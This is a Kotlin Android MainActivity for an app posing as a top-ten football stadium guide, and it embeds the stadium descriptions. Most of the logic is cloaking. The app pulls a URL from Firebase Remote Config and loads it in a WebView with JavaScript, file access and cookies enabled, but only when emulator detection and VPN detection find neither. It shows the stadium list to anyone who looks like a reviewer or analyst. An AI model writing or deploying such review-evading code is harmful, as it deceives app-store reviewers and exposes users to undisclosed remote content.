package com.example.stadium

import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Environment
import android.os.Parcelable
import android.provider.MediaStore
import android.util.Log
import android.webkit.CookieManager
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.example.scaffold.R
import com.example.stadium.recyclerview.StadiumRecyclerView
import com.google.firebase.remoteconfig.BuildConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : AppCompatActivity() {
    //your view connected
    lateinit var resultButton: Button

    var webView: WebView? = null
    private var mUploadMessage: ValueCallback<Uri?>? = null
    private var mCapturedImageURI: Uri? = null
    private var mFilePathCallback: ValueCallback<Array<Uri>>? = null
    private var mCameraPhotoPath: String? = null


    //нужно добавить вопросы, картики, тексты сюда


    // index of Question
    private var currentIndex: Int = 0
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
      //
        val remoteString: String = loadRemoteString(context = this)
        if (remoteString == "") {
            try {


            val remoteConfig = FirebaseRemoteConfig.getInstance()
            val config: FirebaseRemoteConfigSettings = FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600).build()
            remoteConfig.setConfigSettingsAsync(config)
            remoteConfig.fetchAndActivate().addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    val result = remoteConfig.getString("url")
                    val vpnBool = remoteConfig.getBoolean("to")

                    if (vpnBool) {
                        if (result == "" || checkIsEmu() || vpnActive(context = this)) {
                            //game view
                            codeGame(savedInstanceState = savedInstanceState)

                        } else {
                            //code webview
                            val remoteString = remoteConfig.getString("url")
                            saveRemoteString(this, remoteString)

                            viewWebActivity(
                                savedInstanceState = savedInstanceState,
                                remoteString = remoteString
                            )


                        }

                    } else {
                        val remoteString = remoteConfig.getString("url")
                        if (remoteString.isEmpty() || checkIsEmu()) {
                            //game view
                            codeGame(savedInstanceState = savedInstanceState)
                        } else {
                            saveRemoteString(this, remoteString)
                            viewWebActivity(
                                savedInstanceState = savedInstanceState,
                                remoteString = remoteString
                            )
                        }

                    }


                }
            }
                    } catch (e: Error){
                        noInternetActivity()
                    }
                } else{

            if(isOnline()){
                //code webview
                viewWebActivity(savedInstanceState= savedInstanceState, remoteString = remoteString)

            }else{
              noInternetActivity()
            }

                }
    }


    fun codeGame(savedInstanceState: Bundle?){
        //code game paste your code
        setContentView(R.layout.activity_main)
        val activityImageView = findViewById<ImageView>(R.id.actyvityImageView)
        activityImageView.setBackgroundColor(Color.WHITE)
        val titleTextView: TextView = findViewById(R.id.information_text_view)
        titleTextView.text ="With the world having much love for football, the need for better and bigger stadiums has always resulted in some iconic infrastructures, several of which have become world’s best stadiums. If you are unaware of where these beautiful stadiums are located, below is the top ten list of football stadiums in the world. "
        val recyclerView = findViewById<RecyclerView>(R.id.beast_stadium_recycler_view)
        val stadiumRecyclerView = StadiumRecyclerView(mQuestionBank, mContext = this)
        recyclerView.adapter = stadiumRecyclerView
        recyclerView.layoutManager = LinearLayoutManager(applicationContext)


    }
    fun viewWebActivity(savedInstanceState: Bundle?, remoteString: String){

        setContentView(R.layout.web_view_activity)
        webView = findViewById(R.id.webView)
        webView?.webViewClient= WebViewClient()
        webView!!.webChromeClient = ChromeClient()
        var webSettings = webView?.settings
        webSettings?.javaScriptEnabled = true
        webSettings?.loadWithOverviewMode =true
        webSettings?.useWideViewPort =true
        webSettings?.domStorageEnabled =true
        webSettings?.databaseEnabled = true
        webSettings?.setSupportZoom(false)
        webSettings?.allowFileAccess = true
        webSettings?.allowContentAccess = true
        webSettings?.loadWithOverviewMode =true
        webSettings?.useWideViewPort =true




        webSettings?.javaScriptCanOpenWindowsAutomatically =true

        if( savedInstanceState != null){
            webView?.restoreState(savedInstanceState)
        } else webView?.loadUrl(remoteString)

        val cookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)



    }
    fun noInternetActivity(){
        setContentView(R.layout.no_internet_activity)
    }
    override fun onSaveInstanceState(outState: Bundle) {

        super.onSaveInstanceState(outState)
        webView?.saveState(outState)
    }

    override fun onRestoreInstanceState(savedInstanceState: Bundle) {

        super.onRestoreInstanceState(savedInstanceState)
        webView?.restoreState(savedInstanceState)
    }
    override fun onBackPressed() {
        if (webView!!.canGoBack()) {
            webView!!.goBack()
        }
    }

    fun isOnline(): Boolean {

        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val nw = connectivityManager.activeNetwork ?: return false
            val actNw = connectivityManager.getNetworkCapabilities(nw) ?: return false
            return when {
                actNw.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true
                actNw.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true
                //for other device how are able to connect with Ethernet
                actNw.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> true
                else -> false
            }
        } else {
            val nwInfo = connectivityManager.activeNetworkInfo ?: return false
            return nwInfo.isConnected
        }


    }

    @Throws(IOException::class)
    private fun createImageFile(): File {
        // Create an image file name
        val timeStamp =
            SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
        val imageFileName = "JPEG_" + timeStamp + "_"
        val storageDir = Environment.getExternalStoragePublicDirectory(
            Environment.DIRECTORY_PICTURES
        )
        return File.createTempFile(
            imageFileName,  /* prefix */
            ".jpg",  /* suffix */
            storageDir /* directory */
        )
    }


        inner class ChromeClient : WebChromeClient() {
        // For Android 5.0
        override fun onShowFileChooser(
            view: WebView,
            filePath: ValueCallback<Array<Uri>>,
            fileChooserParams: FileChooserParams
        ): Boolean {
            // Double check that we don't have any existing callbacks
            if (mFilePathCallback != null) {
                mFilePathCallback!!.onReceiveValue(null)
            }
            mFilePathCallback = filePath
            var takePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
            if (takePictureIntent!!.resolveActivity(packageManager) != null) {
                // Create the File where the photo should go
                var photoFile: File? = null
                try {
                    photoFile = createImageFile()
                    takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath)
                } catch (ex: IOException) {
                    // Error occurred while creating the File
                    Log.e("ErrorCreatingFile", "Unable to create Image File", ex)
                }

                // Continue only if the File was successfully created
                if (photoFile != null) {
                    mCameraPhotoPath = "file:" + photoFile.absolutePath
                    takePictureIntent.putExtra(
                        MediaStore.EXTRA_OUTPUT,
                        Uri.fromFile(photoFile)
                    )
                } else {
                    takePictureIntent = null
                }
            }
            val contentSelectionIntent = Intent(Intent.ACTION_GET_CONTENT)
            contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE)
            contentSelectionIntent.type = "image/*"
            val intentArray: Array<Intent?>
            intentArray = takePictureIntent?.let { arrayOf(it) } ?: arrayOfNulls(0)
            val chooserIntent = Intent(Intent.ACTION_CHOOSER)
            chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent)
            chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser")
            chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray)
            startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODE)
            return true
        }

        // openFileChooser for Android 3.0+
        // openFileChooser for Android < 3.0
        @JvmOverloads
        fun openFileChooser(uploadMsg: ValueCallback<Uri?>?, acceptType: String? = "") {
            mUploadMessage = uploadMsg
            // Create AndroidExampleFolder at sdcard
            // Create AndroidExampleFolder at sdcard
            val imageStorageDir = File(
                Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_PICTURES
                ), "AndroidExampleFolder"
            )
            if (!imageStorageDir.exists()) {
                // Create AndroidExampleFolder at sdcard
                imageStorageDir.mkdirs()
            }

            // Create camera captured image file path and name
            val file = File(
                imageStorageDir.toString() + File.separator + "IMG_"
                        + System.currentTimeMillis().toString() + ".jpg"
            )
            mCapturedImageURI = Uri.fromFile(file)

            // Camera capture image intent
            val captureIntent = Intent(
                MediaStore.ACTION_IMAGE_CAPTURE
            )
            captureIntent.putExtra(MediaStore.EXTRA_OUTPUT, mCapturedImageURI)
            val i = Intent(Intent.ACTION_GET_CONTENT)
            i.addCategory(Intent.CATEGORY_OPENABLE)
            i.type = "image/*"

            // Create file chooser intent
            val chooserIntent = Intent.createChooser(i, "Image Chooser")

            // Set camera intent to file chooser
            chooserIntent.putExtra(
                Intent.EXTRA_INITIAL_INTENTS, arrayOf<Parcelable>(captureIntent)
            )

            // On select image call onActivityResult method of activity
            startActivityForResult(chooserIntent, FILECHOOSER_RESULTCODE)
        }


        //openFileChooser for other Android versions
        fun openFileChooser(
            uploadMsg: ValueCallback<Uri?>?,
            acceptType: String?,
            capture: String?
        ) {
            openFileChooser(uploadMsg, acceptType)
        }


    }
    public override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode != INPUT_FILE_REQUEST_CODE || mFilePathCallback == null) {
                super.onActivityResult(requestCode, resultCode, data)
                return
            }
            var results: Array<Uri>? = null

            // Check that the response is a good one
            if (resultCode == RESULT_OK) {
                if (data == null) {
                    // If there is not data, then we may have taken a photo
                    if (mCameraPhotoPath != null) {
                        results = arrayOf(Uri.parse(mCameraPhotoPath))
                    }
                } else {
                    val dataString = data.dataString
                    if (dataString != null) {
                        results = arrayOf(Uri.parse(dataString))
                    }
                }
            }
            mFilePathCallback!!.onReceiveValue(results)
            mFilePathCallback = null
        } else if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.KITKAT) {
            if (requestCode != FILECHOOSER_RESULTCODE || mUploadMessage == null) {
                super.onActivityResult(requestCode, resultCode, data)
                return
            }
            if (requestCode == FILECHOOSER_RESULTCODE) {
                if (null == mUploadMessage) {
                    return
                }
                var result: Uri? = null
                try {
                    result = if (resultCode != RESULT_OK) {
                        null
                    } else {

                        // retrieve from the private variable if the intent is null
                        if (data == null) mCapturedImageURI else data.data
                    }
                } catch (e: Exception) {
                    Toast.makeText(
                        applicationContext, "activity :$e",
                        Toast.LENGTH_LONG
                    ).show()
                }
                mUploadMessage!!.onReceiveValue(result)
                mUploadMessage = null
            }
        }
        return
    }
    private fun checkIsEmu(): Boolean {
        if (BuildConfig.DEBUG) return false

        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        val brand = Build.BRAND

        var result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware == "goldfish"
                || Build.BRAND.contains("google")
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))


        if (result) return true
        result =
            result or (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
        if (result) return true
        result = result or ("google_sdk" == buildProduct)
        return result

    }

    companion object {
        private const val INPUT_FILE_REQUEST_CODE = 1
        private const val FILECHOOSER_RESULTCODE = 1
    }

    fun vpnActive(context: Context): Boolean {
        //this method doesn't work below API 21
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return false
        var vpnInUse = false
        val connectivityManager =
            context.getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val activeNetwork = connectivityManager.activeNetwork
            val caps = connectivityManager.getNetworkCapabilities(activeNetwork)
            return caps!!.hasTransport(NetworkCapabilities.TRANSPORT_VPN)
        }
        val networks = connectivityManager.allNetworks
        for (i in networks.indices) {
            val caps = connectivityManager.getNetworkCapabilities(networks[i])
            if (caps!!.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                vpnInUse = true
                break
            }
        }
        return vpnInUse
    }

    fun startStadiumInfoActicity(position: Int){
        val intent = Intent(this, StadiumInfoActuvity::class.java)
        intent.putExtra("POSITION", position)
        startActivity(intent)
        finish()
    }
}


const val PREFS_NAME = "SCAFFOLD"
const val REMOTE_STRING = "REMOTESTRING"
const val DEFAULT_STRING = ""
fun loadRemoteString(context: Context): String{
    val prefs = context.getSharedPreferences(PREFS_NAME, 0)
    val prefString = prefs.getString(REMOTE_STRING, DEFAULT_STRING)
    return  prefString ?: DEFAULT_STRING
}

fun saveRemoteString(context: Context, remoteString: String){
    val putstring = context.getSharedPreferences(PREFS_NAME, 0).edit().putString(REMOTE_STRING, remoteString).apply()
}


val mQuestionBank: List<Question> = listOf<Question>(
    Question(resStadiumImage = R.drawable.soccer_city_by_africa, nameStadium = "Soccer City, South Africa", descriptionStadium ="Opened in 1989, the First National Bank Stadium—known as Soccer City—was renovated in 2009 ahead of the 2010 World Cup in South Africa.\n" +
            "\n" +
            "Although it is home to South African club side Kaizer Chiefs, the stadium is fondly remembered for hosting the showpiece event of the 2010 WC-final, but also for hosting the opening game and goal of the tournament—Siphiwe Tshabalala finding the back of the Mexican net with a thumping effort.\n" +
            "\n" +
            "The incessant noise of the vuvuzela can prove hard to ignore, but it should take nothing away from a truly wonderful football stadium.", descriptionImage   = R.drawable.soccer_city_south_africa_2 ),
    Question(resStadiumImage = R.drawable.maracana_stadium_, nameStadium = "The Maracanã, Rio de Janeiro", descriptionStadium = "The Maracanã is one of the most notable stadiums in world football, situated in one of the most beautiful cities throughout the world.\n" +
            "\n" +
            "The stadium hosted the 1950 decisive World Cup group-stage match (there was no final that year) between Brazil and Uruguay that saw a staggering capacity of 199,854. Although the hosts tasted bitter defeat, the match will go down as one of the classics in the game's history.", descriptionImage = R.drawable.maracana_2
    ),
    Question(resStadiumImage = R.drawable.san_rio, nameStadium = "San Siro, Italy", descriptionStadium = "Known as the San Siro, the multipurpose stadium is home to two football heavyweights and archrivals AC Milan and Internazionale. It is the country's most famous and largest ground.\n" +
            "\n" +
            "With some of the game's greatest footballers gracing its pitch and having hosted European Cup and Champions League finals, the San Siro is one of the most revered and respected stadiums in the world. It can carry 80,018 people and is designed in such a manner so as to give every spectator maximum visibility regardless of where he may be seated.", descriptionImage = R.drawable.san_rio_2
    ),
    Question(resStadiumImage = R.drawable.anfield_road, nameStadium = "Anfield Road, United Kingdom", descriptionStadium = "Though not a huge stadium in terms of capacity by any means (Capacity: 45,276), the legendary atmosphere at Anfield known throughout the world makes the home of Liverpool one of the great stadiums.\n" +
            "\n" +
            "Home to the Reds, who have won five European Cup titles, Anfield is always a treat for members of any visiting team, though it continues to instil fear into any opposition. From the famous “This Is Anfield” sign hanging in the tunnel, to the passionate home fans singing \"You'll Never Walk Alone,\" Anfield will forever be a favourite amongst players and fans alike.", descriptionImage = R.drawable.anfield_2
    ),
    Question(resStadiumImage = R.drawable.santiago_bernabeu, nameStadium = "Santiago Bernabeu, Spain", descriptionStadium = "The Santiago Bernabeu is home to one of Europe's most successful club. With nine European titles to their name, Real Madrid's place in the upper echelons of world football is secure, and there could be no more fitting venue for such a club to play.\n" +
            "\n" +
            "Originally opened in 1947, the Santiago Bernabeu has since been renovated twice—in 1982 and 2001—in order to match the ambitions of the Galacticos. The stadium has been home to many of the world's greatest players over the years, with the likes of Ferenc Puskas, Zinedine Zidane, Ronaldo and Cristiano Ronaldo all strutting their stuff in the famous ground.\n" +
            "\n" +
            "Though overshadowed by the Camp Nou's capacity, the Santiago Bernabeu has always been a first pick when it comes to hosting football events and, due to its prestige, is likely to do so for years to come.", descriptionImage = R.drawable.santiago_bernabeu_2
    ),
    Question(resStadiumImage = R.drawable.estadio_azteco, nameStadium = "Azteca, Mexico", descriptionStadium = "Mexico City's Estadio Azteca is renowned for its huge capacity(104,000) and electric atmosphere when full, but it will go down in history as the only stadium to host two World Cup finals.\n" +
            "\n" +
            "Unfortunately for England fans, it is also the venue for Diego Maradona's infamous “Hand of God” goal.\n" +
            "\n" +
            "The venue may not be fondly remembered by the enormity of England fans, but there is no denying that the stadium—the third-largest football stadium in the world—is one of the finest around.", descriptionImage = R.drawable.aztec2
    ),
    Question(resStadiumImage = R.drawable.camp_nou, nameStadium = "Camp Nou, Spain", descriptionStadium = "The Camp Nou is Europe's largest football stadium(Capacity: 98,757) and is home to one of the great football teams. Barcelona's motto “mes que un club” (more than a club) is iconic throughout the footballing world, and their stadium is a huge part of everything Barcelona stands for.\n" +
            "\n" +
            "The capacity of the Camp Nou once eclipsed 120,000 for the 1982 World Cup finals, but due to changes in laws regarding standing in stadiums, it has now been reduced.", descriptionImage = R.drawable.camp_nou_2
    ),
    Question(resStadiumImage = R.drawable.old_trafford, nameStadium = "Old Trafford, United Kingdom", descriptionStadium = "Old Trafford's tenants split opinion. You either love them or you hate them. But irrespective of your slant, there's no hiding away from the fact that “The Theatre of Dreams” is a truly magnificent venue.\n" +
            "\n" +
            "Opened in 1910, the home of the Red Devils now seats over 75,000 fans—after its 2006 renovation—and is England's largest club stadium.\n" +
            "\n" +
            "With former manager Sir Alex Ferguson recently leaving his post, Manchester United look set to embark on a new era. One thing's for sure, however: Fans from around the world will continue flocking to the cosmopolitan Old Trafford to take in the magic of the stadium and to watch one of football's most successful clubs.", descriptionImage = R.drawable.old_trafford_2
    ),
    Question(resStadiumImage = R.drawable.allianz_arena, nameStadium = "The Allianz Arena, Germany", descriptionStadium = "The beautifully designed Allianz Arena is home to both Munich-based football teams: Bayern Munich and 1860 Munich. It is the only stadium across Europe that is able to change colours to reflect which of the two teams are playing—red for Bayern and blue for 1860 Munich.\n" +
            "\n" +
            "The stadium has been a huge hit with both sets of fans thanks to the fans being closer to the pitch—something that caused an issue at the previous site, the Olympiastadion, which had a running track around the pitch that made for a rather poor atmosphere.\n" +
            "\n" +
            "The relatively new Allianz Arena will surely make a name for itself as one of the greatest stadiums in world football for years to come.", descriptionImage = R.drawable.allianz_arena_2
    ),
    Question(resStadiumImage = R.drawable.wembley, nameStadium = "Wembley, United Kingdom", descriptionStadium = "Wembley Stadium is, without doubt, the most iconic stadium in world football. (Capacity: 90,000)\n" +
            "\n" +
            "Reopened in 2007, the new Wembley was built on the site of the previous 1923 Wembley Stadium. Famous as one of the most electric atmospheres in world football, the new design has encompassed everything that was great about the original stadium and has added to that further. The famous Twin Towers may no longer be standing, but in their place is the Wembley Arch.\n" +
            "\n" +
            "Holding some of the most prestigious events in European and international football is now commonplace at “The Home of Football.”", descriptionImage = R.drawable.wembley_2
    )
)